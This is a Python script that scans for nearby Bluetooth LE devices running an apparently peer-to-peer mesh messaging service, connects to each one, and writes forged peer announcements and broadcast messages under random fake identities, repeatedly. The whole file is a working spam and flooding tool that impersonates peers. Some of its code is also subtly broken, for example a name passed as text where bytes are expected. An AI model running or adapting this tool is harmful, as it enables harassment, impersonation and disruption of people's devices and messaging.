import asyncio
import sys
import time
import struct
import uuid
import random
from bleak import BleakScanner, BleakClient

# Constants
TARGET_SERVICE_UUIDS = ["F47B5E2D-4A9E-4C5A-9B3F-8E1D2C3A4B5C"]
TARGET_CHARACTERISTIC_UUID = "A1B2C3D4-E5F6-4A5B-8C9D-0E1F2A3B4C5D"
HEX_DIGITS = '0123456789abcdef'

# Packet Generators
def make_announce_packet(peer_id, display_name, ttl_value=3):
    packet = b""
    packet += bytes.fromhex("0101")
    packet += struct.pack('>B', ttl_value)
    packet += struct.pack('>Q', int(time.time() * 1000))
    packet += b'\x00'
    packet += struct.pack('>H', len(display_name))
    packet += peer_id
    packet += display_name
    return packet

def make_message_packet(peer_id, display_name, body, ttl_val=3):
    payload = b""
    payload += bytes.fromhex("10")
    payload += struct.pack('>Q', int(time.time() * 1000))
    message_uid = str(uuid.uuid4()).encode("utf-8")
    payload += struct.pack('>B', len(message_uid))
    payload += message_uid
    payload += struct.pack('>B', len(display_name))
    payload += display_name
    payload += struct.pack('>H', len(body))
    payload += body
    payload += struct.pack('>B', len(peer_id))
    payload += peer_id

    full_packet = b""
    full_packet += bytes.fromhex("0104")
    full_packet += struct.pack('>B', ttl_val)
    full_packet += struct.pack('>Q', int(time.time() * 1000))
    full_packet += b'\x01'
    full_packet += struct.pack('>H', len(payload))
    full_packet += peer_id
    full_packet += bytes.fromhex("ffffffffffffffff")
    full_packet += payload

    return full_packet

# BLE Spam Function
async def send_ble_spam(repeat_count, name_bytes, message_bytes):
    nearby = await BleakScanner.discover(return_adv=True, service_uuids=TARGET_SERVICE_UUIDS)

    for device, adv_data in nearby.values():
        for attempt in range(num_senders):
            temp_id = bytes.fromhex(''.join(random.choices(HEX_DIGITS, k=16)))
            temp_name = bytes.fromhex(''.join(random.choices(HEX_DIGITS, k=8)))

            try:
                async with BleakClient(device.address, timeout=2) as connection:
                    matched = any(
                        str(char.uuid).upper() == TARGET_CHARACTERISTIC_UUID
                        for service in connection.services
                        for char in service.characteristics
                    )

                    if matched:
                        print(f"[+] Connected to {device.address} - dispatching packets...")

                        ann_packet = make_announce_packet(temp_id, temp_name)
                        await connection.write_gatt_char(TARGET_CHARACTERISTIC_UUID, ann_packet, response=False)
                        await asyncio.sleep(0.5)

                        for _ in range(repeat_count):
                            msg_packet = make_message_packet(temp_id, temp_name, message_bytes, ttl_val=5)
                            await connection.write_gatt_char(TARGET_CHARACTERISTIC_UUID, msg_packet, response=False)
                            await asyncio.sleep(0.5)
            except Exception:
                continue

# Main execution block
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python {sys.argv[0]} <num_messages> <num_senders> <message>")
        sys.exit(1)

    try:
        repetitions = int(sys.argv[1])
        num_senders = int(sys.argv[2])
        msg_content = sys.argv[3].encode("utf-8")
        display_name = "bitis"
    except ValueError:
        print("Error: First 2 arguments must be a valid integers.")
        sys.exit(1)

    asyncio.run(send_ble_spam(repetitions, display_name, msg_content))

